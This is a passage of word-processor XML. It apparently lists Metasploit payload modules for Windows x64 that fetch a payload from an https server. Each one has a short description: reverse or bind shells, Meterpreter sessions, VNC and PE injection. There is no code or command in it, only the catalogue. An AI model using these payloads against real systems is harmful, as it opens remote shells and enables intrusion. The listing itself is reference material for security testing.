      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp_uuid <text:s text:c="16"/>d from an http server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_winhttp <text:s text:c="17"/>d from an http server. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/vncinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_winhttps <text:s text:c="16"/>d from an http server. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTPS (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/custom/bi <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_ipv6_tcp <text:s text:c="21"/>d from an https server. Custom</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shellcode stage. Listen for an</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>IPv6 connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/custom/bi <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_ipv6_tcp_uuid <text:s text:c="16"/>d from an https server. Custom</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shellcode stage. Listen for an</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>IPv6 connection with UUID Suppo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/custom/bi <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_named_pipe <text:s text:c="19"/>d from an https server. Custom</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shellcode stage. Listen for a p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ipe connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/custom/bi <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_tcp <text:s text:c="26"/>d from an https server. Custom</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shellcode stage. Listen for a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/custom/bi <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_tcp_rc4 <text:s text:c="22"/>d from an https server. Custom</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shellcode stage. Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/custom/bi <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_tcp_uuid <text:s text:c="21"/>d from an https server. Custom</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shellcode stage. Listen for a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnection with UUID Support (Wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ndows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/custom/re <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_http <text:s text:c="22"/>d from an https server. Custom</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shellcode stage. Tunnel communi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cation over HTTP (Windows x64 w</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/custom/re <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_https <text:s text:c="21"/>d from an https server. Custom</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shellcode stage. Tunnel communi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cation over HTTP (Windows x64 w</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/custom/re <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_named_pipe <text:s text:c="16"/>d from an https server. Custom</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shellcode stage. Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker via a named pipe</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/custom/re <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_tcp <text:s text:c="23"/>d from an https server. Custom</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shellcode stage. Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/custom/re <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_tcp_rc4 <text:s text:c="19"/>d from an https server. Custom</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shellcode stage. Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/custom/re <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_tcp_uuid <text:s text:c="18"/>d from an https server. Custom</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shellcode stage. Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker with UUID Suppor</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/custom/re <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>verse_winhttp <text:s text:c="19"/>d from an https server. Custom</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shellcode stage. Tunnel communi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cation over HTTP (Windows x64 w</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>inhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/custom/re <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_winhttps <text:s text:c="18"/>d from an https server. Custom</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shellcode stage. Tunnel communi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cation over HTTPS (Windows x64</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/exec <text:s text:c="6"/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d from an https server. Execute</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>an arbitrary command (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/loadlibra <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ry <text:s text:c="30"/>d from an https server. Load an</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>arbitrary x64 library path</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/messagebo <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>x <text:s text:c="31"/>d from an https server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>dialog via MessageBox using a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>customizable title, text &amp; icon</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er/bind_ipv6_tcp <text:s text:c="16"/>d from an https server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er/bind_ipv6_tcp_uuid <text:s text:c="11"/>d from an https server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for an IPv6 connection with UUI</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>D Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er/bind_named_pipe <text:s text:c="14"/>d from an https server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a pipe connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er/bind_tcp <text:s text:c="21"/>d from an https server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er/bind_tcp_rc4 <text:s text:c="17"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er/bind_tcp_uuid <text:s text:c="16"/>d from an https server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection with UUID Supp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ort (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er/reverse_http <text:s text:c="17"/>d from an https server. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>communication over HTTP (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er/reverse_https <text:s text:c="16"/>d from an https server. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>communication over HTTP (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er/reverse_named_pipe <text:s text:c="11"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="38"/>back to the attacker via a nam</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed pipe pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er/reverse_tcp <text:s text:c="18"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er/reverse_tcp_rc4 <text:s text:c="14"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er/reverse_tcp_uuid <text:s text:c="13"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er/reverse_winhttp <text:s text:c="14"/>d from an https server. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>communication over HTTP (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er/reverse_winhttps <text:s text:c="13"/>d from an https server. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>communication over HTTPS (Windo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ws x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er_bind_named_pipe <text:s text:c="14"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>to victim and spawn a Meterpre</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ter shell. Requires Windows XP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er_bind_tcp <text:s text:c="21"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>to victim and spawn a Meterpre</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ter shell. Requires Windows XP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er_reverse_http <text:s text:c="17"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to attacker and spawn a M</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>eterpreter shell. Requires Wind</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ows XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er_reverse_https <text:s text:c="16"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to attacker and spawn a M</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>eterpreter shell. Requires Wind</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ows XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er_reverse_ipv6_tcp <text:s text:c="13"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to attacker and spawn a M</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>eterpreter shell. Requires Wind</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ows XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/meterpret <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er_reverse_tcp <text:s text:c="18"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to attacker and spawn a M</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>eterpreter shell. Requires Wind</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ows XP SP2 or newer.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/peinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>bind_ipv6_tcp <text:s text:c="19"/>d from an https server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/peinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_ipv6_tcp_uuid <text:s text:c="14"/>d from an https server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for an IPv6 connection with UUI</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>D Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/peinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_named_pipe <text:s text:c="17"/>d from an https server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a pipe connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/peinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp <text:s text:c="24"/>d from an https server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/peinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp_rc4 <text:s text:c="20"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/peinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp_uuid <text:s text:c="19"/>d from an https server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection with UUID Supp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ort (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/peinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_named_pipe <text:s text:c="14"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker via a nam</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed pipe pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/peinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp <text:s text:c="21"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/peinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp_rc4 <text:s text:c="17"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/peinject/ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp_uuid <text:s text:c="16"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/pingback_ <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp <text:s text:c="21"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to attacker and report UU</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ID (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/powershel <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>l_bind_tcp <text:s text:c="22"/>d from an https server</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/powershel <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>l_reverse_tcp <text:s text:c="19"/>d from an https server</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/powershel <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>l_reverse_tcp_ssl <text:s text:c="15"/>d from an https server</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/shell/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_ipv6_tcp <text:s text:c="22"/>d from an https server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>piped command shell (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64) (staged). Listen for an IPv</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>6 connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/shell/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>d_ipv6_tcp_uuid <text:s text:c="17"/>d from an https server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>piped command shell (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64) (staged). Listen for an IPv</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>6 connection with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>(Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/shell/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_named_pipe <text:s text:c="20"/>d from an https server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>piped command shell (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64) (staged). Listen for a pipe</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/shell/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_tcp <text:s text:c="27"/>d from an https server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>piped command shell (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64) (staged). Listen for a conn</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/shell/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_tcp_rc4 <text:s text:c="23"/>d from an https server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>piped command shell (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64) (staged). Connect back to t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>he attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/shell/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_tcp_uuid <text:s text:c="22"/>d from an https server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>piped command shell (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64) (staged). Listen for a conn</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ection with UUID Support (Windo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ws x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/shell/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp <text:s text:c="24"/>d from an https server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>piped command shell (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64) (staged). Connect back to t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>he attacker (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/shell/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp_rc4 <text:s text:c="20"/>d from an https server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>piped command shell (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64) (staged). Connect back to t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>he attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/shell/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp_uuid <text:s text:c="19"/>d from an https server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>piped command shell (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64) (staged). Connect back to t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>he attacker with UUID Support (</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/shell_bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_tcp <text:s text:c="27"/>d from an https server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection and spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/shell_rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp <text:s text:c="24"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to attacker and spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/vncinject <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_ipv6_tcp <text:s text:c="18"/>d from an https server. Listen</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>for an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/vncinject <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_ipv6_tcp_uuid <text:s text:c="13"/>d from an https server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for an IPv6 connection with UUI</text:p>
